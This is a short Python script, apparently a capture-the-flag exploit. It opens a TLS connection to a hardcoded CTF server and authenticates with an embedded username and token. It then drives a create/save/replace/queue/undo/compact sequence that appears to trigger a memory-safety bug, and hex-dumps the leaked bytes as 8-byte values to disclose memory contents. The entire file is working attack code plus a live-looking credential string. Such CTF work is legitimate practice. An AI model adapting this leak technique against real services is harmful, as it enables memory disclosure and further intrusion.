import socket
import ssl
import struct


HOST = "65.21.179.193"
PORT = 9305
SERVER_NAME = "ctf.roshancodes.com"
AUTH = (
    "rupesh:24615f5322b2e341debc09aa9bdf3a15:"
    "79e04d840caa48436b132e3801df168532cfaa797bdd3857cdc0a3ef7cbb4ed8\n"
).encode()


def recv_exact(sock, size):
    chunks = []
    while size:
        chunk = sock.recv(size)
        if not chunk:
            raise EOFError("connection closed")
        chunks.append(chunk)
        size -= len(chunk)
    return b"".join(chunks)


def line(sock):
    out = bytearray()
    while not out.endswith(b"\n"):
        out += recv_exact(sock, 1)
    return bytes(out)


def request(sock, op, doc=0, arg=0, body=b"", framed=False):
    sock.sendall(struct.pack("<BBH", op, doc, arg) + body)
    if framed:
        size = struct.unpack("<H", recv_exact(sock, 2))[0]
        return recv_exact(sock, size)
    return line(sock)


def main():
    context = ssl.create_default_context()
    with socket.create_connection((HOST, PORT), timeout=10) as raw:
        with context.wrap_socket(raw, server_hostname=SERVER_NAME) as sock:
            sock.settimeout(10)
            sock.sendall(AUTH)
            print("auth", line(sock).rstrip())

            print("create", request(sock, 1, 0, 32, b"A" * 32).rstrip())
            print("save", request(sock, 2, 0).rstrip())
            print("replace", request(sock, 3, 0, 32, b"B" * 32).rstrip())
            print("queue", request(sock, 5, 0, 0).rstrip())
            print("undo", request(sock, 4, 0).rstrip())
            print("compact", request(sock, 6, 0).rstrip())
            leaked = request(sock, 7, 0, 0, framed=True)
            print("render", len(leaked), leaked.hex())
            for offset in range(0, len(leaked), 8):
                chunk = leaked[offset:offset + 8]
                print(f"  +0x{offset:02x}: {chunk.hex()}  0x{int.from_bytes(chunk, 'little'):x}")


if __name__ == "__main__":
    main()
